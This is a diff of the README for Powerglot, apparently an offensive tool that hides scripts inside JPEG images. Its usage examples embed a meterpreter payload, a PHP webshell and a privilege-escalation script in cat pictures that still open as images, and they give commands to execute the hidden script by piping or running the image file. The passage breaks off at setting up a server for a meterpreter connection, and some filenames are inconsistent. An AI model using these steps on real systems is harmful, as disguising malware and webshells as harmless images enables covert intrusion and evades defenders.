@@ -22,27 +22,28 @@ Features:
 
 The following lines show some examples of usage from Powerglot
 ```
-Example 1 - Hiding a powershell/php/shell script in a JPEG image
+# Example 1 - Hiding a powershell/php/shell script in a JPEG image
 
 # python3 powerglot.py -o meterpreter.ps1 cat.jpg cat-hidden1.jpg
 # python3 powerglot.py -o webshell.php cat.jpg cat-hidden2.jpg
 # python3 powerglot.py -o shell.sh cat.jpg cat-hidden3.jpg
 ```
 ```
-Example 2 - Hiding a shell script (linenum.sh) for privilege escalation "hidden" in a JPEG image
+# Example 2 - Hiding a shell script (linenum.sh) for privilege escalation "hidden" in a JPEG image
 
 # python3 powerglot.py -o linenum.sh cat.jpg cat-linenum.jpg
 # file cat-linenum.jpg (It is a valid JPEG file)
-# feh cat-lineum.jpg (The image is properly show in a image viewer)
+# feh cat-lineum.jpg (The image is properly showed in an image viewer)
 
 # We can execute the script in several ways:
+
 a) cat cat-linenum | bash
 b) chmod +x cat-linenum.jpeg; ./cat-linenum.jpeg
 
 ```
-
-
 ```
+# Example 3 - Encoding a powershell script in a JPEG image. For example, a meterpreter
+
 # SERVER
 # Prepare the payload and configure the server to receive a meterpreter connection
 
